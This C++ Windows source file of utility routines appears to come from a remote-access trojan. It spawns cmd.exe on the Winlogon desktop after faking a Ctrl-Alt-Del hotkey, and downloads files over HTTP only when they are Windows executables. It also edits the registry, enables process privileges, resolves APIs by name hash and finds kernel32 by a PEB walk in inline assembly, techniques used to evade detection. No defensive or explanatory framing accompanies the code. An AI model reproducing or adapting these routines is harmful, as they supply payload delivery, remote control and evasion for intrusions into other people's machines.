#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Wtsapi32.lib")
#include "until.h"

unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	
	if(Process32First(handle,info))
	{
		if (strcmpi(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
	}
	return RetProcessID;
}



bool SwitchInputDesktop()
{
 	BOOL	bRet = false;
 	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);


	return bRet;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}
	
	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	
	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}
	
	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}
	
	// We successfully switched desktops!
	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}
	
	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	TCHAR lpFileName[MAX_PATH] = { 0, };
	GetSystemDirectory(lpFileName, MAX_PATH);
	strcat(lpFileName, "\\cmd.exe");
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Winlogon";


	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);

	return TRUE;
}
bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;
	
	hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
	
	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
		return false;
	
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键)
int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, char* szData, LPBYTE szBytes, DWORD lbSize, int Mode)
{
	HKEY   hKey;
	int    ValueDWORD, iResult = 0;
	char* PointStr;
	char   KeyName[32], ValueSz[MAX_PATH], ValueTemp[MAX_PATH];
	DWORD  szSize, dwIndex = 0;

	memset(KeyName, 0, sizeof(KeyName));
	memset(ValueSz, 0, sizeof(ValueSz));
	memset(ValueTemp, 0, sizeof(ValueTemp));

	__try
	{
		if (RegOpenKeyEx(MainKey, SubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			iResult = -1;
			__leave;
		}
		switch (Mode)
		{
		case 0:
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData, ValueSz);
					iResult = 1;
				}
				break;
			case REG_MULTI_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					for (PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr, 0) + 1)//strchr
					{
						strncat(ValueTemp, PointStr, sizeof(ValueTemp));
						strncat(ValueTemp, " ", sizeof(ValueTemp));
					}
					lstrcpy(szData, ValueTemp);
					iResult = 1;
				}
				break;
			case REG_DWORD:
				szSize = sizeof(DWORD);

				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)&ValueDWORD, &szSize) == ERROR_SUCCESS)
				{
					wsprintfA(szData, "%d", ValueDWORD);
					iResult = 1;
				}
				break;
			case REG_BINARY:
				szSize = lbSize;

				if (RegQueryValueEx(hKey, Vname, NULL, &Type, szBytes, &szSize) == ERROR_SUCCESS)
				{
					wsprintfA(szData, "%08X", Type);
					iResult = 1;
				}
				break;
			}
			break;
		default:
			break;
		}
	}
	__finally
	{

		RegCloseKey(MainKey);
		RegCloseKey(hKey);
	}


	return iResult;
}

//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, char* szData, DWORD dwData, int Mode)
{
	HKEY  hKey;
	DWORD dwDisposition;
	int   iResult = 0;

	__try
	{
		//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
		switch (Mode)
		{
		case 0:
			if (RegCreateKeyEx(MainKey, SubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
				__leave;
		case 1:
			if (RegOpenKeyEx(MainKey, SubKey, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
				__leave;
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
			case REG_MULTI_SZ:
				if (RegSetValueEx(hKey, Vname, 0, Type, (LPBYTE)szData, lstrlen(szData) + 1) == ERROR_SUCCESS)
					iResult = 1;
				break;
			case REG_DWORD:
				if (RegSetValueEx(hKey, Vname, 0, Type, (LPBYTE)&dwData, sizeof(DWORD)) == ERROR_SUCCESS)
					iResult = 1;
				break;
			case REG_BINARY:
				break;
			}
			break;
		case 2:
			if (RegOpenKeyEx(MainKey, SubKey, NULL, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
				__leave;
			if (RegDeleteKey(hKey, Vname) == ERROR_SUCCESS)
				iResult = 1;
			break;
		case 3:
			if (RegOpenKeyEx(MainKey, SubKey, NULL, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
				__leave;
			if (RegDeleteValue(hKey, Vname) == ERROR_SUCCESS)
				iResult = 1;
			break;
		default:
			__leave;

		}
	}
	__finally
	{
		RegCloseKey(MainKey);
		RegCloseKey(hKey);
	}
	return iResult;
}


BOOL DebugPrivilege(const char* PName, BOOL bEnable)
{
	bool              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;


	HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
	typedef HANDLE(WINAPI* TGetCurrentProcess)(VOID);
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess");


	if (!OpenProcessToken(myGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;


	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);



	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);

	return bResult;
}

//获取函数名的hash
DWORD GetProcHash(char* lpProcName) {
	char* p = lpProcName;
	DWORD result = 0;
	do {
		result = (result << 7) - result;
		result += *p;
	} while (*p++);
	return result;
}
//比较字符串
BOOL MyStrcmp(DWORD str1, char* str2) {

	if (str1 == GetProcHash(str2)) {
		return 0;
	}
	return 1;
}
//获得函数地址
DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName) {

	if (hModule ==NULL)
	{
		return (DWORD)hModule;
	}
	DWORD dwProcAddress = 0;
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((DWORD)pDosHdr + pDosHdr->e_lfanew);
	//获取导出表
	PIMAGE_EXPORT_DIRECTORY pExtTbl = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHdr + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	//解析导出表
	//获取函数地址数组
	PDWORD pAddressOfFunc = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfFunctions);
	//获取名字数组
	PDWORD pAddressOfName = (PDWORD)((DWORD)hModule + pExtTbl->AddressOfNames);
	//获取序号导出表
	PWORD pAddressOfNameOrdinal = (PWORD)((DWORD)hModule + pExtTbl->AddressOfNameOrdinals);
	//判断序号或字符串导出
	if ((DWORD)lpProcName & 0xffff0000)
	{
		//通过名称获取导出地址
		DWORD dwSize = pExtTbl->NumberOfNames;
		for (DWORD i = 0; i < dwSize; i++)
		{
			//获取名称字符串
			DWORD dwAddrssOfName = (DWORD)hModule + pAddressOfName[i];
			//判断名称
			int nRet = MyStrcmp(lpProcName, (char*)dwAddrssOfName);
			if (nRet == 0)
			{
				//名称一致则通过名称序号表获得序号
				WORD wHint = pAddressOfNameOrdinal[i];
				//根据序号获得函数地址
				dwProcAddress = (DWORD)hModule + pAddressOfFunc[wHint];
				return dwProcAddress;
			}
		}
		//找不到则地址为0
		dwProcAddress = 0;
	}
	else
	{
		//通过序号获取导出地址
		DWORD nId = (DWORD)lpProcName - pExtTbl->Base;
		dwProcAddress = (DWORD)hModule + pAddressOfFunc[nId];
	}
	return dwProcAddress;
}

//获取kernel32基址
HMODULE GetKernel32Base() {
	HMODULE hKer32 = NULL;
	_asm {
		mov eax, fs: [0x18] ;//找到teb
		mov eax, [eax + 0x30];//peb
		mov eax, [eax + 0x0c];//PEB_LDR_DATA
		mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
		mov eax, [eax];//ntdll
		mov eax, [eax];//kernel32
		mov eax, dword ptr[eax + 0x18];//kernel32基址
		mov hKer32, eax
	}
	return hKer32;
}


FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName)
{
	HMODULE hModule;
	hModule = GetModuleHandleA(lpFileName);
	if (hModule == NULL)
		hModule = LoadLibraryA(lpFileName);
	if (hModule != NULL)
		return GetProcAddress(hModule, lpProcName);
	else
		return NULL;

}
#endif // !defined(AFX_UNTIL_CPP_INCLUDED)